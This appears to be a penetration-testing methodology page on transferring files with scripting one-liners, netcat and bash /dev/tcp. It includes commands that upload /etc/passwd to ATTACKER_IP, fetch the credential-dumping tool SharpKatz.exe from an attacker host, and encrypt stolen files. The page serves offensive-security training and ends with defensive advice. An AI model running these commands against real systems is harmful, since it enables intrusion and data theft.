---
layout: page
title: "Transferring Files with Code"
subtitle: "Using Python, PHP, Ruby, Perl, JavaScript, VBScript and netcat when standard tools are unavailable"
permalink: /methodology/shells-and-transfers/transfers-with-code/
---

**Purpose:** when the standard tools are missing, use the scripting languages or network primitives already present on the host to move a file. Each method still needs a hash check, and each leaves traces that defenders can see.

## Workflow

1. Identify which interpreters are on the target: Python, PHP, Ruby, Perl, cscript (Windows), or bash alone.
2. Use the interpreter's standard library to fetch or post the file.
3. If no interpreter is present, fall back to netcat or bash's `/dev/tcp`.
4. Verify the file hash on the destination host.

## Download operations

### Python

```bash
python3 -c 'import urllib; urllib.request.urlretrieve("https://RAW_HOST/LinEnum.sh", "LinEnum.sh")'
```

The notes use the Python 2 spelling, `urllib.urlretrieve`. Python 3 places it in `urllib.request`, so the form above is the one to use on modern targets.

### PHP

PHP can use `file_get_contents` with `file_put_contents`:

```bash
php -r '$file = file_get_contents("https://RAW_HOST/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'
```

`fopen` with a read-write loop is an alternative when the file is large or memory is limited.

### Ruby and Perl

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://RAW_HOST/LinEnum.sh")))'
```

```bash
perl -e 'use LWP::Simple; getstore("https://RAW_HOST/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript with cscript (Windows)

Create `wget.js`. It uses `WinHttp.WinHttpRequest.5.1` to fetch the URL and `ADODB.Stream` to write the response to disk. The script takes the URL and the output path as arguments. Then run:

```powershell
cscript.exe /nologo wget.js https://RAW_HOST/PowerView.ps1 PowerView.ps1
```

### VBScript with cscript (Windows)

A VBScript variant (`wget.vbs`) uses `Microsoft.XMLHTTP` and `Adodb.Stream`:

```powershell
cscript.exe /nologo wget.vbs https://RAW_HOST/PowerView.ps1 PowerView2.ps1
```

## Upload operations

On the attack host, start the upload server:

```bash
python3 -m uploadserver 443
```

On the target, post a file with the `requests` library:

```bash
python3 -c 'import requests; requests.post("http://ATTACKER_IP:443/upload", files={"files": open("/etc/passwd", "rb")})'
```

## Netcat transfers

Receiver on the attack host, sending the file as input:

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Receiver on the target, collecting the file:

```bash
nc ATTACKER_IP 443 > SharpKatz.exe
```

Sending in the other direction with Ncat, where the target is listening:

```bash
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
ncat --send-only TARGET_IP 8000 < SharpKatz.exe
```

The notes call for `--recv-only` when the compromised host runs netcat rather than Ncat. `-q 0` makes netcat quit once its input reaches end of file.

### Bash /dev/tcp without netcat

```bash
cat < /dev/tcp/ATTACKER_IP/443 > SharpKatz.exe
```

## Encrypted transfers

Encrypting a file before transfer protects its contents in transit and in logs.

With the PowerShell AES module (import it first):

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "KEY" -Path .\scan-results.txt
```

The output is written as `scan-results.txt.aes`.

With OpenSSL on Linux:

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

PBKDF2 derives the encryption key from the passphrase. The high iteration count slows brute-force attempts against the passphrase.

## Remote sessions and shared drives

- **PowerShell Remoting (WinRM)** allows `Copy-Item -ToSession` when HTTP, HTTPS and SMB are blocked. Test the port first, then create a session and copy in either direction. The account needs administrative rights or membership of Remote Management Users.
- **RDP drive redirection** exposes a local folder to the remote session. `rdesktop` and `xfreerdp` support it with `-r disk:` and `/drive:` options.

## What to look for

- Which interpreters are installed, and their versions
- Whether the target can reach the URL or port used
- Whether WinRM (5985 or 5986) is open, which opens another transfer path

## Pitfalls

- Piping a downloaded script into an interpreter runs code you have not reviewed. Read the script first.
- Interpreter flags and module names differ between Python 2 and 3. Confirm the version on the target.
- Netcat variants have different options. Test with a small file first.

## Defense and prevention

Restrict which interpreters can make outbound network connections, particularly on servers. Alert on interpreter processes that open sockets to external addresses, and on new WinRM sessions from unexpected accounts.
